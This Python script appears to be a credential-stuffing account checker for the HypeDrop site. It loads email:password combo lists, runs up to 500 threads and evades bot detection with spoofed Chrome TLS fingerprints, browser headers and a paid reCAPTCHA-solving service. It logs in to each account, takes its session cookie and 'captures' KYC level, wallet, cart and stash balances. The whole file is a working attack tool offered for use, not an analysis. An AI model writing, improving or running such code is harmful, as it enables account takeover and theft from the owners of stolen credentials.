def get_id(session_cookie):
    try:
        session = tls_client.Session(
            client_identifier="chrome_131",
            random_tls_extension_order=True
        )

        cookies = {
            'session': session_cookie,
        }

        proxy = ""
        session.proxies = {
            'http': proxy,
            'https': proxy
        }

        headers = {
            'accept': 'application/json, text/plain, */*',
            'accept-language': 'en-US,en;q=0.9',
            'apollographql-client-name': 'hypedrop-www',
            'apollographql-client-version': 'v367',
            'ngsw-bypass': 'true',
            'origin': 'https://www.hypedrop.com',
            'priority': 'u=1, i',
            'referer': 'https://www.hypedrop.com/',
            'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132", "Microsoft Edge";v="132"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36 Edg/132.0.0.0',
        }

        response = session.get(
            f'https://api.hypedrop.com/graphql?operationName=CurrentUser&variables=%7B%7D&extensions=%7B%22persistedQuery%22:%7B%22version%22:1,%22sha256Hash%22:%225af2848fc9b8cafb78834b2aea3f0536861365b7767ae11f47d2b429ce0e9762%22%7D%7D',
            cookies=cookies,
            headers=headers
        )

        response_json = response.json()
        if not response_json or 'data' not in response_json:
            print(f"Invalid response: {response_json}")
            return "Invalid response from server"
            
        if not response_json['data'] or 'currentUser' not in response_json['data']:
            print(f"No user data in response: {response_json}")
            return "No user data found"
            
        current_user = response_json['data']['currentUser']
        if not current_user:
            return "Empty user data"

        id = current_user.get('id')
        kyc_level = current_user.get('currentKycLevel', {}).get('name', 'Unknown')
        user_level = current_user.get('level', 'Unknown')
        
        stash_amount = 0
        for wallet in current_user.get('wallets', []):
            if wallet.get('name') == 'STASH':
                stash_amount = wallet.get('amount', 0)
                print(f'STASH Amount: {stash_amount}')
                break

        walletAmount = get_wallet_amount(id, session_cookie)
        cart_amount = get_cart_level(id, session_cookie)

        currentCapture = f"Kyc_level: {kyc_level} | account_level: {user_level} | wallet_amount: {walletAmount} | cart_amount: {cart_amount} | stash_amount: {stash_amount}"
        return currentCapture

    except requests.exceptions.RequestException as e:
        print(f"Request failed: {str(e)}")
        return f"Request failed: {str(e)}"
    except Exception as e:
        print(f"Error getting user info: {str(e)}")
        return f"Error: {str(e)}"




def get_v3_token():
    try:
        task_payload = {
            "clientKey":"", 
            "task": {
            "type": "RecaptchaV3TaskProxyless",
            "websiteURL": "https://www.hypedrop.com",
            "websiteKey": "6LfVf3wUAAAAAL8T79ziKWF-Jmkc3LT9fzEVoiO5",
            "websiteInfo": "",
            "pageAction": "login"
        }
    }

        result = requests.post(
            "https://api.nextcaptcha.com/createTask",
            json=task_payload,
            headers={"Content-Type": "application/json"},
            verify=False
        ).json()
        
        print(result)
        if 'taskId' not in result:
            return None
            
        task_id = result['taskId']
        
        while True:
            check_result = requests.post(
                "https://api.nextcaptcha.com/getTaskResult",
                json={
                    "clientKey": "",
                    "taskId": task_id
                },
                headers={"Content-Type": "application/json"},
                verify=False,
            ).json()

            
            if check_result.get('status') == 'ready':
                token = check_result.get('solution', {}).get('gRecaptchaResponse')
                if token:
                    print(f"[{time.strftime('%Y-%m-%d')}][{time.strftime('%H:%M:%S')}] Recaptcha solved successfully...")
                    return token
            elif check_result.get('errorId', 0) != 0:
                return None
                
            time.sleep(3)
            
    except Exception as e:
        print(f"Error getting reCAPTCHA token: {e}")
        return None

def check_hypedrop(email, password):
    session = tls_client.Session(
        client_identifier="chrome_131",
        random_tls_extension_order=True
    )
    
    headers = {
    'accept': 'application/json, text/plain, */*',
    'accept-language': 'en-US,en;q=0.9',
    'content-type': 'application/json',
    'origin': 'https://www.hypedrop.com',
    'priority': 'u=1, i',
    'referer': 'https://www.hypedrop.com/',
    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132", "Microsoft Edge";v="132"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36 Edg/132.0.0.0',
    }

    params = {
        'redirectUri': 'https://www.hypedrop.com',
    }

    recaptcha_token = get_v3_token()

    proxy = ""
    session.proxies = {
        'http': proxy,
        'https': proxy
    }


    json_data = {
        'signUp': False,
        'email': email,
        'password': password,
        'redirectUri': 'https://www.hypedrop.com/activate/:code',
        'seonSession': 'Web;cab4f431d89478283ec3d818a489bb30d984700ea21b1e81aedeb568f05103a1;3Mrm65ic1xoFMYFrZKSdCA==;',
        'version': 7,
        'twoFactorToken': None,
        'trustUntil': '',
        'emailVerificationCode': None,
        'recaptcha': recaptcha_token
    }


    login_response = session.post(
        "https://api.hypedrop.com/auth/local",
        params=params,
        json=json_data,
        headers=headers,
    )


    print(login_response.json())

    if "Email/Password combination not found" in login_response.text:
        return {"error": True, "message": "Invalid credentials"}
    
    if "RECAPTCHA" in login_response.text:
        return {"error": True, "message": "Captcha required"}

    if not '"success":true' in login_response.text:
        print(login_response.text)
        return {"error": True, "message": "Unknown error"}

    session_cookie = None
    max_retries = 10
    retry_count = 0
    
    while retry_count < max_retries and session_cookie is None:
        if 'Set-Cookie' in login_response.headers:
            cookie_header = login_response.headers['Set-Cookie']
            if 'session=' in cookie_header:
                session_cookie = cookie_header.split('session=')[1].split(';')[0]
                print(f"session cookie: {session_cookie}")
                break
            else:
                print(f"No session cookie found in header, retrying... (attempt {retry_count + 1}/{max_retries})")
        else:
            print(f"No Set-Cookie header found, retrying... (attempt {retry_count + 1}/{max_retries})")
            
        recaptcha_token = get_v3_token()
        json_data['recaptcha'] = recaptcha_token
            
        login_response = session.post(
            "https://api.hypedrop.com/auth/local",
            params=params,
            json=json_data,
            headers=headers
        )
        retry_count += 1
        time.sleep(1)
        
    if session_cookie is None:
        print("Failed to get session cookie after all retries")
        return {"error": True, "message": "Failed to get session cookie"}

    if '"success":true' in login_response.text:
        capture = get_id(session_cookie)
        return {"success": True, "message": "Login successful", "capture": capture}

   
def main():
    os.makedirs('./output', exist_ok=True)
    
    while True:
        try:
            thread_count = int(input("Enter number of threads to run (1-500): "))
            if 1 <= thread_count <= 500:
                break
            print("Please enter a number between 1 and 50")
        except ValueError:
            print("Please enter a valid number")

    task_queue = Queue()
    results = []

    threads = []
    for _ in range(thread_count):
        t = threading.Thread(target=worker, args=(task_queue, results))
        t.daemon = True
        t.start()
        threads.append(t)

    credentials = []
    try:
        with open('./input/emails.txt', 'r') as f:
            lines = f.readlines()
            if lines:
                for line in lines:
                    if line.strip() and ':' in line:
                        email, password = line.strip().split(':', 1)
                        credentials.append((email.strip(), password.strip()))
            else:
                print("Error: emails.txt is empty")
                sys.exit(1)
    except FileNotFoundError:
        print("Error: ./input/emails.txt not found")
        sys.exit(1)
    except Exception as e:
        print(f"Error reading credentials file: {str(e)}")
        sys.exit(1)

    if not credentials:
        print("No valid credentials found in emails.txt")
        sys.exit(1)

    for email, password in credentials:
        task_queue.put((email, password))

    for _ in range(thread_count):
        task_queue.put((None, None))

    task_queue.join()

    for t in threads:
        t.join()

if __name__ == "__main__":
    main()
